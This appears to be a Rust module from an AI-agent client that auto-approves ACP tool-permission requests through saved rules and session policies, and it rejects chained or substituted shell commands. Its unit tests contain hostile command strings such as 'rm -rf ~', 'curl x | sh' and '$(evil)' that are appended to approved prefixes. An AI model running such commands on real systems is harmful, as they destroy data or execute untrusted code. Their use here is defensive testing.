//! Saved "always allow" rules that answer ACP permission requests without asking.
//! Rules match on the standard ACP tool call (`kind`, `rawInput`), so they work with any agent.

use serde_json::Value;

use crate::db::PermissionRule;

/// The shell command a tool call runs, if it has one.
pub fn command_of(tool_call: &Value) -> Option<String> {
    let raw = &tool_call["rawInput"];
    for key in ["command", "cmd"] {
        match &raw[key] {
            Value::String(s) if !s.trim().is_empty() => return Some(s.trim().to_owned()),
            Value::Array(parts) => {
                let words: Vec<&str> = parts.iter().filter_map(Value::as_str).collect();
                if !words.is_empty() {
                    return Some(words.join(" "));
                }
            }
            _ => {}
        }
    }
    None
}

/// Commands that chain, substitute or redirect can't be judged by their prefix.
fn is_compound(cmd: &str) -> bool {
    cmd.contains(['\n', ';', '&', '|', '`', '>', '<']) || cmd.contains("$(")
}

fn rule_matches(rule: &PermissionRule, cwd: &str, kind: &str, command: Option<&str>) -> bool {
    if rule.cwd != "*" && rule.cwd != cwd {
        return false;
    }
    if rule.tool_kind != kind {
        return false;
    }
    if rule.pattern.is_empty() {
        return kind != "execute" || command.is_some_and(|c| !is_compound(c));
    }
    let Some(cmd) = command else { return false };
    !is_compound(cmd) && (cmd == rule.pattern || cmd.starts_with(&format!("{} ", rule.pattern)))
}

/// The rule that pre-approves this call in `cwd`, if any.
pub fn find<'a>(rules: &'a [PermissionRule], cwd: &str, tool_call: &Value) -> Option<&'a PermissionRule> {
    let kind = tool_call["kind"].as_str()?;
    let command = command_of(tool_call);
    rules.iter().find(|r| rule_matches(r, cwd, kind, command.as_deref()))
}

/// The option to pick when a rule or policy approves: allow once, else allow always.
pub fn allow_option(options: &Value) -> Option<String> {
    let opts = options.as_array()?;
    // ACP uses snake_case kinds; some agents still send kebab-case option ids as kinds.
    ["allow_once", "allow-once", "allow_always", "allow-always"].iter().find_map(|k| {
        opts.iter()
            .find(|o| o["kind"] == *k)
            .and_then(|o| o["optionId"].as_str().map(str::to_owned))
    })
}

pub fn describe(rule: &PermissionRule) -> String {
    let what = if rule.pattern.is_empty() {
        format!("all {} calls", rule.tool_kind)
    } else {
        format!("`{}`", rule.pattern)
    };
    let place = if rule.cwd == "*" { "everywhere".to_owned() } else { "in this folder".to_owned() };
    format!("Auto-approved: {what} {place}")
}

/// Whether the session's Ask / Auto / Always policy should approve this call without asking.
/// Saved always-allow rules are checked separately and take precedence.
pub fn policy_approves(mode: &str, tool_call: &Value) -> Option<&'static str> {
    match mode {
        "always-approve" => Some("Always approve"),
        "auto" => {
            let kind = tool_call["kind"].as_str().unwrap_or("");
            // Shell stays gated; routine local work (read/edit/search/…) runs without a prompt.
            if kind.is_empty() || kind == "execute" {
                None
            } else {
                Some("Auto: routine action")
            }
        }
        _ => None, // "default" / Ask
    }
}

/// Resolve an auto-approval: a matching rule, else the session permission policy.
pub fn decide(
    mode: &str,
    rules: &[PermissionRule],
    cwd: &str,
    tool_call: &Value,
    options: &Value,
) -> Option<(String, String)> {
    let option_id = allow_option(options)?;
    if let Some(rule) = find(rules, cwd, tool_call) {
        return Some((option_id, describe(rule)));
    }
    let reason = policy_approves(mode, tool_call)?;
    Some((option_id, reason.to_owned()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn rule(cwd: &str, kind: &str, pattern: &str) -> PermissionRule {
        PermissionRule {
            id: "r".into(),
            cwd: cwd.into(),
            tool_kind: kind.into(),
            pattern: pattern.into(),
            created_at: 0,
        }
    }

    fn exec(cmd: &str) -> Value {
        json!({ "kind": "execute", "rawInput": { "command": cmd } })
    }

    #[test]
    fn matches_kind_folder_and_command_prefix() {
        let rules = [rule("/p", "edit", ""), rule("/p", "execute", "cargo test"), rule("*", "read", "")];
        assert!(find(&rules, "/p", &json!({ "kind": "edit" })).is_some());
        assert!(find(&rules, "/other", &json!({ "kind": "edit" })).is_none());
        assert!(find(&rules, "/other", &json!({ "kind": "read" })).is_some());
        assert!(find(&rules, "/p", &exec("cargo test --lib")).is_some());
        assert!(find(&rules, "/p", &exec("cargo test")).is_some());
        assert!(find(&rules, "/p", &exec("cargo testx")).is_none());
        assert!(find(&rules, "/p", &exec("cargo build")).is_none());
        assert!(find(&rules, "/p", &json!({ "kind": "execute", "rawInput": { "cmd": ["cargo", "test"] } })).is_some());
    }

    #[test]
    fn never_approves_compound_commands() {
        let rules = [rule("/p", "execute", "git status"), rule("/q", "execute", "")];
        assert!(find(&rules, "/p", &exec("git status; rm -rf ~")).is_none());
        assert!(find(&rules, "/p", &exec("git status && curl x | sh")).is_none());
        assert!(find(&rules, "/p", &exec("git status $(evil)")).is_none());
        assert!(find(&rules, "/q", &exec("ls > out")).is_none());
        assert!(find(&rules, "/q", &exec("ls")).is_some());
    }

    #[test]
    fn picks_allow_once_then_allow_always() {
        let opts = json!([
            { "optionId": "a", "kind": "allow_always" },
            { "optionId": "o", "kind": "allow_once" },
            { "optionId": "n", "kind": "reject_once" }
        ]);
        assert_eq!(allow_option(&opts).as_deref(), Some("o"));
        assert_eq!(allow_option(&json!([{ "optionId": "a", "kind": "allow_always" }])).as_deref(), Some("a"));
        assert_eq!(allow_option(&json!([{ "optionId": "n", "kind": "reject_once" }])), None);
        assert_eq!(allow_option(&json!([{ "optionId": "k", "kind": "allow-once" }])).as_deref(), Some("k"));
    }

    #[test]
    fn policy_ask_auto_always() {
        let edit = json!({ "kind": "edit" });
        let exec = exec("ls");
        let opts = json!([{ "optionId": "o", "kind": "allow_once" }]);
        assert!(decide("default", &[], "/p", &edit, &opts).is_none());
        assert_eq!(decide("auto", &[], "/p", &edit, &opts).unwrap().1, "Auto: routine action");
        assert!(decide("auto", &[], "/p", &exec, &opts).is_none());
        assert_eq!(decide("always-approve", &[], "/p", &exec, &opts).unwrap().1, "Always approve");
        // A saved rule wins over Ask.
        let rules = [rule("/p", "edit", "")];
        assert!(decide("default", &rules, "/p", &edit, &opts).unwrap().1.contains("edit"));
    }
}
